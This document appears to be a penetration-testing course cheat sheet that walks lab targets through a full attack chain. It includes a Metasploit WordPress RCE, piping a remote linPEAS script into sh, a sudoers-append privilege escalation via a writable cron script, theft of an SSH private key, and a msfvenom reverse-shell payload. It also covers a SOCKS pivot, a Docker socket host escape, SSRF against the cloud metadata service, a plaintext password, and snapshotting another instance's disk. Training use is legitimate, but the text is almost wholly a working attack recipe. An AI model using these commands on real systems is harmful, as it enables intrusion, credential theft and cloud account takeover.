# Penetesting Start to Finish Commands
## Getting Connected


### SSH
Download pem from Discord
Get your attack box IP address from the student list

ssh -i operator.pem ubuntu@<your attack box IP>

### RDP
ssh -i operator.pem ubuntu@<your attack box IP>
sudo passwd ubuntu
#Set and memorize password
#Use RDP client to connect

## Classic Path
### Web.Hack.This
Enumerate via NMAP
nmap -Pn -sT -sV --top-ports=100 web.hack.this

#View site through firefox - see that it says WordPress at the bottom of the page
wpscan --url web.hack.this

#See the pie-register version 3.7.1.4 - google it to find metasploit module
#Start metasploit
msfconsole
use exploit/unix/webapp/wp_pie_register_bypass_rce
set RHOSTS web.hack.this
run

#A successful exploit results in a Meterpreter session
#Meterpreter
shell

#Look at https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS for instructions on how to use it and what checks it is performing
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

#Identify writeable directories
#Find move-wp-error-logs.py under the cron section
#Identify that the move-wp-error-logs.py file is writable
cat /etc/crontab
ls -al /var/www/
cat /var/www/move-wp-error-logs.py

#Privilege Escalation Exploit
echo "os.system('echo \"www-data ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers')" >> /var/www/move-wp-error-logs.py

#Wait for 1 minute
sudo whoami

#Investigate user directories
sudo ls -al /home
sudo ls -al /home/bob
sudo ls -al /home/bob/.ssh

#Get private key
sudo cat /home/bob/.ssh/id_rsa
sudo cat /home/bob/.ssh/authorized_keys

#Create a local file with the key data
vi bob.key

#change permissions so SSH doesn't yell at you
chmod 400 bob.key

#exit shell back to meterpreter session
exit

#Background meterpreter session to setup listener
background

#Setup the listener
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LPORT 4545

#Get local IP
ip addr show

#Set local IP
set LHOST <local ip>
exploit -j

#Create new meterpreter payload in a separate terminal window
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP of your attack box> LPORT=4545 -f elf > ms_x64.elf

#Upload and execute the payload
sessions -i 1
upload /home/ubuntu/ms_x64.elf /var/www/html/ms_x64.elf
shell
cd /var/www/html
chmod 700 ms_x64.elf
sudo ./ms_x64.elf&
exit

#Background the session so we can setup proxystuff
background

#we now have root
#SOCKS stuff with root session
use post/multi/manage/autoroute
set subnet 10.10.30.0/24
set SESSION 2
run

route add 10.10.30.0 255.255.255.0 2

use auxiliary/server/socks_proxy
set version 4a
run

#Edit proxychains file to point to local proxy port 1080
sudo vi /etc/proxychains.conf

#connect in through SOCKS
proxychains4 ssh -i bob.key bob@dev.hack.internal

#dev.hack.internal
Investigate locally running ports
ss -ant

#google port 2375
#Privilege escalation - https://book.hacktricks.xyz/network-services-pentesting/2375-pentesting-docker
export DOCKER_HOST="tcp://localhost:2375"
docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash

#This mounts the host's file system to /host/ and then creates a chroot environment that uses the host's filesystem as its root drive
docker run #executes a container
-it #interactive terminal
-v /:/host/ #mounts the host's filesystem to the root of the contaner


## Cloud Path
#thumbnailer.hack.this
#Create account
#IDOR via changing profile ID
http://thumbnailer.web.this/profile/1

#Switch back to your profile (http://thumbnailer.web.this/profile/1)
#Enter a URL to a valid pic.
https://i.pinimg.com/originals/5d/55/04/5d5504c3767ab6055c4733d5ad9ebfc5.jpg

#Identify that it is getting the pic and embedding it base64 encoded into the page
#make a different request and parse out the base64 bit
http://169.254.169.254/latest/meta-data/iam/security-credentials/

#From the command line
curl -b cookies.txt -c cookies.txt -X POST http://thumbnailer.hack.this/login --data-raw 'email=test%40test.com&password=test'

##SSRF for metadata service
curl -b cookies.txt -c cookies.txt -X POST http://thumbnailer.hack.this/get-thumbnail --data-raw 'url=http://169.254.169.254/latest/user-data'
echo <base64 encoded userdata> | base64 --decode

#Identify password for dev user on thumbnailer - AeOPG6L197DW
ssh dev@thumbnailer.hack.this

#Further query 
curl http://169.254.169.254/latest/meta-data/iam/security-credentials

#identify that a role is configured
curl http://169.254.169.254/latest/meta-data/iam/security-credentials

#We don't need to get the credentials because the aws CLI utility will query them for us
#Explore what API actions we have
aws lambda list-functions
aws sqs list-queues
aws s3 ls
aws ec2 describe-instances > ec2.json

#Looks like we have EC2 and S3 access. Feel free to further explore the bucket but for now let's find out what other instances are in the account
#List instances by name
aws ec2 describe-instances --output table --query 'Reservations[].Instances[].[Tags[?Key==`Name`] | [0].Value, State.Name]'
aws ec2 describe-instances --filter Name=tag:Name,Values=admin.hack.internal

#This is an interesting box but we don't have any access. What can we do?
#Get volume ID
aws ec2 describe-instances --filter Name=tag:Name,Values=admin.hack.internal --query 'Reservations[].Instances[].BlockDeviceMappings[].Ebs'

#Create a snapshot
aws ec2 create-snapshot --volume-id vol-0165b7733a124b873 # Record the ID of the snapshot

#Get necessary data for mounting the drive
curl http://169.254.169.254/latest/meta-data/placement/availability-zone
curl http://169.254.169.254/latest/meta-data/instance-id

aws ec2 create-volume --snapshot-id snap-0626b1e111d8588a2 --availability-zone us-east-1a
aws ec2 attach-volume --device /dev/xvdh --instance-id <instance ID of thumbnailer> --volume-id <volume ID of the newly created volume>
sudo mkdir /mnt/admin-drive
sudo mount /dev/xvdh1 /mnt/admin-drive

#Query the user data of the admin box
#First get the instance ID
aws ec2 describe-instances --query 'Reservations[].Instances[].[Tags[?Key==`Name`] | [0].Value, InstanceId]'
aws ec2 describe-instance-attribute --instance-id i-08afcd3702d116424 --attribute userData